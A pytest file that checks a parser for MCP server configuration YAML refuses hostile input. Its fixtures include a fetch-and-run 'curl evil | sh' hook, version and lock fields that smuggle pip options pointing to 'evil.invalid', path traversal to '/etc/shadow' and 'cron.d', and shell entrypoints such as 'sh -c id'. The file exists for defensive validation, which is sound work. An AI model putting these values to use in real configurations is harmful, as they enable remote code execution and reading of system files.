"""`mcp/<name>/server.yaml` as hostile bytes (contract 01b).

Every assumption `mcpserver`'s docstring writes down gets a fixture here that
must be refused. A reader who adds a field to that module adds a row here.
"""

from __future__ import annotations

from pathlib import Path

import pytest
import yaml
from agent_release.errors import Refusal, RefusalCode
from agent_release.mcpserver import (
    MAX_SERVER_BYTES,
    MAX_TOOLS,
    ServerFile,
    Source,
    parse_server,
    read_registry,
    read_server_dir,
)

#: Contract 01b §8.1, word for word.
KAGI = """
name: kagi
identity: "The fleet's Kagi API key. Search and page extraction, no account writes."
install:
  source: pypi
  package: kagimcp
  version: 1.0.2
  lock: mcp/kagi/install.lock
  python: "3.12"
run:
  entrypoint: kagimcp
  env:
    KAGI_API_KEY: secret:kagi_api_key
tools:
  - name: kagi_search_fetch
    description: Search the web and return ranked results with snippets.
  - name: kagi_extract
    description: Fetch one URL and return its readable text.
"""

#: Contract 01b §8.2's pin, with the tools list cut to two.
GITHUB_CODE = """
name: github-code
identity: "Fine-grained PAT for every repository except the platform three."
install:
  source: github-release
  repo: github/github-mcp-server
  version: 1.12.0
  asset: github-mcp-server_Linux_x86_64.tar.gz
  sha256: f34de295acd8f1012c7f2c0e3b909d87361d0993b9489b57ee92ac72b85d7cca
run:
  entrypoint: github-mcp-server
  args: [stdio, --toolsets=context,repos]
tools:
  - name: get_file_contents
    description: Read one file from a repository.
  - name: create_pull_request
    description: Open a pull request.
    write: true
"""

#: Contract 01b §8.4's pin. It carries NO `ref`: the `mcp-servers`
#: component tag is the version of every server agent-mcp ships (§3.3).
VIKUNJA = """
name: vikunja-finance
identity: "The Vikunja bot bot-finance, on the finance epic."
install:
  source: agent-mcp
run:
  entrypoint: vikunja-mcp
  env:
    VIKUNJA_URL: http://127.0.0.1:3456
    VIKUNJA_TOKEN: secret:vikunja_token_finance
    VIKUNJA_ACTOR: bot-finance
tools:
  - { name: get_ticket, description: Read one ticket. }
"""


def _kagi_body() -> dict[str, object]:
    loaded: dict[str, object] = yaml.safe_load(KAGI)

    return loaded


def _parse(body: dict[str, object], directory: str = "kagi") -> ServerFile:
    return parse_server(yaml.safe_dump(body).encode("utf-8"), directory)


def _refusal(body: dict[str, object], directory: str = "kagi") -> Refusal:
    with pytest.raises(Refusal) as caught:
        _parse(body, directory)

    assert caught.value.code is RefusalCode.SERVER

    return caught.value


# -- the three examples of contract 01b parse ---------------------------


def test_the_contract_s_pypi_example_parses() -> None:
    server = parse_server(KAGI.encode("utf-8"), "kagi")

    assert server.name == "kagi"
    assert server.user == "mcp-kagi"
    assert server.pin.source is Source.PYPI
    assert server.pin.requirement() == "kagimcp==1.0.2"
    # The closure is DECLARED, not produced by the release (contract 01b
    # §3.4).
    assert server.pin.lock == "mcp/kagi/install.lock"
    assert server.entrypoint == "kagimcp"
    assert server.tools == ("kagi_search_fetch", "kagi_extract")


def test_the_contract_s_github_example_parses_and_builds_its_url() -> None:
    server = parse_server(GITHUB_CODE.encode("utf-8"), "github-code")

    assert server.pin.source is Source.GITHUB_RELEASE
    assert server.pin.sha256 is not None
    # `bin/agent-control-deploy` has fetched exactly this URL on every
    # deploy since it was written: the tag is `v` + the declared version.
    assert server.pin.asset_url() == (
        "https://github.com/github/github-mcp-server/releases/download/"
        "v1.12.0/github-mcp-server_Linux_x86_64.tar.gz"
    )


def test_the_contract_s_agent_mcp_example_parses() -> None:
    server = parse_server(VIKUNJA.encode("utf-8"), "vikunja-finance")

    assert server.pin.source is Source.AGENT_MCP
    assert server.pin.python == "3.12"
    # §3.3: the whole pin is the component tag the release deploys, and
    # the file carries no version field of any kind.
    assert (server.pin.package, server.pin.version, server.pin.sha256) == (None, None, None)


# -- assumption 1 to 4: the file, the shape, the keys, the name ---------


def test_a_file_over_the_byte_cap_is_refused_before_the_parse() -> None:
    padded = KAGI + ("\n# " + "a" * 100) * (MAX_SERVER_BYTES // 100)

    with pytest.raises(Refusal, match="larger than"):
        parse_server(padded.encode("utf-8"), "kagi")


def test_a_file_that_is_not_a_mapping_is_refused() -> None:
    with pytest.raises(Refusal, match="not a mapping"):
        parse_server(b"- one\n- two\n", "kagi")


def test_an_unknown_top_level_key_is_refused_rather_than_dropped() -> None:
    body = _kagi_body()
    body["post_install"] = "curl evil | sh"

    assert "unknown key post_install" in _refusal(body).detail


def test_a_name_that_is_not_the_directory_is_refused() -> None:
    assert "differs from the directory name" in _refusal(_kagi_body(), "weather").detail


def test_a_name_with_a_path_separator_is_refused() -> None:
    body = _kagi_body()
    body["name"] = "../../etc/cron.d/x"

    assert "field 'name' is malformed" in _refusal(body, "kagi").detail


# -- assumption 7 and 8: one source, one pin ----------------------------


def test_a_pypi_pin_that_also_carries_a_sha256_is_refused() -> None:
    body = _kagi_body()
    install: dict[str, object] = body["install"]  # type: ignore[assignment]
    install["sha256"] = "f" * 64

    assert "does not belong to pypi" in _refusal(body).detail


def test_a_github_pin_with_no_sha256_is_refused() -> None:
    body: dict[str, object] = yaml.safe_load(GITHUB_CODE)
    install: dict[str, object] = body["install"]  # type: ignore[assignment]
    del install["sha256"]

    assert "required for github-release" in _refusal(body, "github-code").detail


def test_an_unknown_source_is_refused() -> None:
    body = _kagi_body()
    install: dict[str, object] = body["install"]  # type: ignore[assignment]
    install["source"] = "file"

    assert "not one of contract 01b's three" in _refusal(body).detail


@pytest.mark.parametrize(
    "version",
    [
        ">=1.0.2",  # a range makes a hash meaningless (contract 01b §3.1)
        "1.0.2 --index-url=http://evil.invalid",  # a second argv word
        "1.0.2\n",  # `fullmatch`, not `$`
        "1.0.2+local",  # a local segment resolves elsewhere
        "-rPWNED",  # an option, not a version
    ],
)
def test_a_version_that_is_not_one_exact_artifact_is_refused(version: str) -> None:
    body = _kagi_body()
    install: dict[str, object] = body["install"]  # type: ignore[assignment]
    install["version"] = version

    assert "field 'install.version' is malformed" in _refusal(body).detail


def test_a_pypi_pin_with_no_lock_is_refused() -> None:
    """A `pypi` server with no committed closure is one root
    would have to resolve, and a closure produced during the release pins
    nothing."""
    body = _kagi_body()
    install: dict[str, object] = body["install"]  # type: ignore[assignment]
    del install["lock"]

    assert "install.lock is required for pypi" in _refusal(body).detail


@pytest.mark.parametrize(
    "path",
    [
        "/etc/shadow",  # absolute
        "../../../etc/shadow",  # out of the checkout
        "mcp/kagi/../../../etc/shadow",  # out of it the long way
        "mcp//kagi/install.lock",  # an empty segment
        "mcp/kagi/",  # a directory
        "-rhttp://evil.invalid/x",  # an argv option
    ],
)
def test_a_lock_path_that_is_not_a_plain_repository_path_is_refused(path: str) -> None:
    body = _kagi_body()
    install: dict[str, object] = body["install"]  # type: ignore[assignment]
    install["lock"] = path

    _refusal(body)


def test_a_github_pin_may_not_carry_a_lock() -> None:
    """One source, one pin. A `github-release` server is pinned by its
    `sha256` and by nothing else."""
    body: dict[str, object] = yaml.safe_load(GITHUB_CODE)
    install: dict[str, object] = body["install"]  # type: ignore[assignment]
    install["lock"] = "mcp/github-code/install.lock"

    assert "does not belong to github-release" in _refusal(body, "github-code").detail


def test_an_interpreter_the_host_does_not_have_is_refused() -> None:
    body = _kagi_body()
    install: dict[str, object] = body["install"]  # type: ignore[assignment]
    install["python"] = "2.7"

    assert "not one of the two interpreters" in _refusal(body).detail


@pytest.mark.parametrize("ref", ["v0.4.6", "mcp-servers-v0.1.0", "main"])
def test_an_agent_mcp_pin_that_carries_a_ref_is_refused(ref: str) -> None:
    """Contract 01b §3.3. Whatever the value
    means, it is a SECOND version beside the component tag, and root
    installs from the tree the release already fetched at that tag. A ref
    root would have to obey is a ref root would have to fetch, after the
    tap, for something the phone never showed."""
    body: dict[str, object] = yaml.safe_load(VIKUNJA)
    install: dict[str, object] = body["install"]  # type: ignore[assignment]
    install["ref"] = ref

    detail = _refusal(body, "vikunja-finance").detail
    assert detail == "install.ref does not belong to agent-mcp"


def test_an_agent_mcp_pin_may_not_borrow_another_source_s_fields() -> None:
    """The rule that makes §3's table closed is unchanged by dropping
    `ref`: `agent-mcp` requires nothing and therefore refuses everything
    except the shared `python`."""
    body: dict[str, object] = yaml.safe_load(VIKUNJA)
    install: dict[str, object] = body["install"]  # type: ignore[assignment]
    install["version"] = "0.4.6"

    assert "does not belong to agent-mcp" in _refusal(body, "vikunja-finance").detail


def test_an_asset_that_names_a_directory_is_refused() -> None:
    body: dict[str, object] = yaml.safe_load(GITHUB_CODE)
    install: dict[str, object] = body["install"]  # type: ignore[assignment]
    install["asset"] = "../../../etc/shadow"

    assert "field 'install.asset' is malformed" in _refusal(body, "github-code").detail


# -- assumption 10 and 11: the entrypoint and the environment -----------


@pytest.mark.parametrize("entrypoint", ["/bin/sh", "../../bin/sh", "-c", "sh -c id"])
def test_an_entrypoint_that_is_not_a_console_script_name_is_refused(entrypoint: str) -> None:
    """`stage7-releases.md` §6 row 9: `command` is a console-script name,
    resolved inside `/opt/mcp/<name>/bin/`, which only the hash-pinned
    install populates."""
    body = _kagi_body()
    run: dict[str, object] = body["run"]  # type: ignore[assignment]
    run["entrypoint"] = entrypoint

    assert "field 'run.entrypoint' is malformed" in _refusal(body).detail


def test_a_literal_credential_in_env_is_refused() -> None:
    """Contract 01b §4.1 rule 2, invariant 13. This is the one mistake that
    would put a credential in git."""
    body = _kagi_body()
    run: dict[str, object] = body["run"]  # type: ignore[assignment]
    run["env"] = {"KAGI_API_KEY": "sk-live-0123456789"}

    detail = _refusal(body).detail
    assert "must name a secret, not a value" in detail
    # The refusal names the VARIABLE and never the value it refused.
    assert "0123456789" not in detail


def test_a_state_dir_env_without_state_dir_is_refused() -> None:
    body = _kagi_body()
    run: dict[str, object] = body["run"]  # type: ignore[assignment]
    run["state_dir_env"] = "KAGI_STATE"

    assert "without run.state_dir" in _refusal(body).detail


# -- assumption 12: the caps --------------------------------------------


def test_more_tools_than_the_cap_are_refused() -> None:
    body = _kagi_body()
    body["tools"] = [{"name": f"t{n}", "description": "one line."} for n in range(MAX_TOOLS + 1)]

    assert f"more than {MAX_TOOLS}" in _refusal(body).detail


def test_one_tool_declared_twice_is_refused() -> None:
    body = _kagi_body()
    body["tools"] = [
        {"name": "kagi_search_fetch", "description": "one."},
        {"name": "kagi_search_fetch", "description": "two."},
    ]

    assert "names one tool twice" in _refusal(body).detail


def test_a_fence_naming_an_undeclared_tool_is_refused() -> None:
    body = _kagi_body()
    body["arg_denies"] = [{"tools": ["kagi_delete_all"], "arg": "path", "values": ["/"]}]

    assert "does not declare" in _refusal(body).detail


# -- assumption 15: a fence's argument (contract 01b §7.2) ---------------


def _fenced(arg: str) -> dict[str, object]:
    body = _kagi_body()
    body["arg_denies"] = [{"tools": "all", "arg": arg, "values": ["a-value"]}]

    return body


@pytest.mark.parametrize("arg", ["repo", "owner/repo", "branch", "from_branch", "a/b"])
def test_a_fence_argument_is_one_name_or_two_joined_by_one_slash(arg: str) -> None:
    """Contract 01b §7.2's composite argument. The console-script pattern
    holds no `/` and would refuse both GitHub servers."""
    assert _parse(_fenced(arg)).arg_denies[0].arg == arg


@pytest.mark.parametrize(
    "arg",
    [
        "owner/repo/branch",
        "/repo",
        "repo/",
        "owner//repo",
        "-repo",
        "owner repo",
        "../etc",
        "9repo",
        "",
    ],
)
def test_a_fence_argument_of_any_other_shape_is_refused(arg: str) -> None:
    """Two names at most, and each is one argument key. The value is
    compared, never executed, but it is still a word out of a hostile file
    and the PEP splits it on `/` (`fences._composite`)."""
    assert "arg_denies.arg' is malformed" in _refusal(_fenced(arg)).detail


def test_the_two_github_fences_of_contract_01b_parse() -> None:
    """§8.2's deny and §8.3's allow, both on `owner/repo`. Refusing either
    is refusing the fleet's whole github split (`docs/rework/spec.md` §4.4)."""
    body: dict[str, object] = yaml.safe_load(GITHUB_CODE)
    body["arg_denies"] = [
        {"tools": "all", "arg": "owner/repo", "values": ["example-owner/agent-control"]}
    ]
    body["arg_allows"] = [
        {"tools": ["get_file_contents"], "arg": "owner/repo", "values": ["example-owner/agent-mcp"]}
    ]
    server = _parse(body, "github-code")

    assert server.arg_denies[0].arg == "owner/repo"
    assert server.arg_denies[0].tools is None
    assert server.arg_allows[0].arg == "owner/repo"


# -- assumption 16: a shared secret (contract 01b §4.3) -----------------

#: `ha` and `ha-read`, cut to what §4.3 is about. One Home Assistant
#: user, two reaches, and §5 rule 5 makes that two files.
HA = """
name: {name}
identity: "The fleet's Home Assistant user. {name}."
install:
  source: pypi
  package: ha-mcp
  version: 8.4.3
  lock: mcp/{name}/install.lock
run:
  entrypoint: ha-mcp
  env:
    HOMEASSISTANT_TOKEN: secret:ha_read_token
tools:
  - {{ name: get_state, description: Read one entity's state. }}
"""


def _ha(name: str, partner: str | None) -> tuple[str, str]:
    text = HA.format(name=name)
    if partner is not None:
        text += f"shared_secrets:\n  - secret: ha_read_token\n    server: {partner}\n"

    return name, text


def _registry(tmp_path: Path, *servers: tuple[str, str]) -> tuple[ServerFile, ...]:
    for name, text in servers:
        directory = tmp_path / name
        directory.mkdir()
        (directory / "server.yaml").write_text(text, encoding="utf-8")

    return read_registry(tmp_path, limit=10)


def test_two_servers_that_both_declare_the_sharing_are_accepted(tmp_path: Path) -> None:
    """The real pair, with the real secret name."""
    found = _registry(tmp_path, _ha("ha", "ha-read"), _ha("ha-read", "ha"))

    assert [one.name for one in found] == ["ha", "ha-read"]
    assert found[0].secrets == ("ha_read_token",)
    assert found[1].shared[0].server == "ha"


def test_a_duplicate_with_no_declaration_at_all_is_still_refused(tmp_path: Path) -> None:
    """§6 row 8's own words, which is the typo case this rule protects."""
    with pytest.raises(Refusal) as caught:
        _registry(tmp_path, _ha("ha", None), _ha("ha-read", None))

    assert caught.value.subject == "mcp/ha-read"
    assert "which ha already binds" in caught.value.detail
    assert "declare the sharing in both files" in caught.value.detail


def test_a_one_sided_declaration_names_the_file_that_is_missing(tmp_path: Path) -> None:
    """`ha-read` says it shares with `ha` and `ha` says nothing. The
    refusal names `ha`, because `ha` is the file to edit."""
    with pytest.raises(Refusal) as caught:
        _registry(tmp_path, _ha("ha", None), _ha("ha-read", "ha"))

    assert caught.value.subject == "mcp/ha"
    assert "does not declare sharing ha_read_token with ha-read" in caught.value.detail


def test_a_declaration_naming_the_wrong_partner_is_refused(tmp_path: Path) -> None:
    """Both files declare a sharing and they do not describe the same
    pair, so neither agreed to anything."""
    with pytest.raises(Refusal):
        _registry(tmp_path, _ha("ha", "kagi"), _ha("ha-read", "ha"))


def test_a_third_server_cannot_join_a_pair(tmp_path: Path) -> None:
    """§4.3 rule 4. `ha` may name one partner, so the third server has
    nobody left to agree with."""
    with pytest.raises(Refusal):
        _registry(tmp_path, _ha("ha", "ha-read"), _ha("ha-read", "ha"), _ha("ha-write", "ha"))


def test_sharing_a_secret_this_file_does_not_name_is_refused() -> None:
    """The declaration would relax §6 row 8 for a name this server has no
    claim on, which is the whole of the rule it relaxes."""
    body = _kagi_body()
    body["shared_secrets"] = [{"secret": "ha_read_token", "server": "ha"}]

    assert "which run.env does not" in _refusal(body).detail


def test_a_server_may_not_be_its_own_partner() -> None:
    body = _kagi_body()
    body["shared_secrets"] = [{"secret": "kagi_api_key", "server": "kagi"}]

    assert "its own partner" in _refusal(body).detail


def test_one_secret_shared_twice_in_one_file_is_refused() -> None:
    body = _kagi_body()
    body["shared_secrets"] = [
        {"secret": "kagi_api_key", "server": "kagi-two"},
        {"secret": "kagi_api_key", "server": "kagi-three"},
    ]

    assert "names one secret twice" in _refusal(body).detail


def test_a_shared_secrets_entry_with_an_unknown_key_is_refused() -> None:
    body = _kagi_body()
    body["shared_secrets"] = [{"secret": "kagi_api_key", "server": "ha", "why": "because"}]

    assert "unknown key why" in _refusal(body).detail


# -- the registry walk ---------------------------------------------------


def test_the_walk_reads_every_declared_server_by_name(tmp_path: Path) -> None:
    for name, text in (("kagi", KAGI), ("vikunja-finance", VIKUNJA)):
        directory = tmp_path / name
        directory.mkdir()
        (directory / "server.yaml").write_text(text, encoding="utf-8")

    found = read_registry(tmp_path, limit=10)

    assert [one.name for one in found] == ["kagi", "vikunja-finance"]


def test_a_registry_with_no_mcp_directory_declares_nothing(tmp_path: Path) -> None:
    """The state before the first server file is written, not an error."""
    assert read_registry(tmp_path / "absent", limit=10) == ()


def test_a_symlinked_server_file_is_not_followed(tmp_path: Path) -> None:
    elsewhere = tmp_path / "elsewhere.yaml"
    elsewhere.write_text(KAGI, encoding="utf-8")
    directory = tmp_path / "mcp" / "kagi"
    directory.mkdir(parents=True)
    (directory / "server.yaml").symlink_to(elsewhere)

    with pytest.raises(Refusal, match="not a regular file"):
        read_server_dir(directory)


def test_a_symlinked_server_directory_is_skipped(tmp_path: Path) -> None:
    real = tmp_path / "real"
    real.mkdir()
    (real / "server.yaml").write_text(KAGI, encoding="utf-8")
    registry = tmp_path / "mcp"
    registry.mkdir()
    (registry / "kagi").symlink_to(real, target_is_directory=True)

    assert read_registry(registry, limit=10) == ()


def test_more_servers_than_the_limit_are_refused(tmp_path: Path) -> None:
    for n in range(3):
        directory = tmp_path / f"s{n}"
        directory.mkdir()
        (directory / "server.yaml").write_text(KAGI.replace("name: kagi", f"name: s{n}"), "utf-8")

    with pytest.raises(Refusal, match="more than 2 servers"):
        read_registry(tmp_path, limit=2)
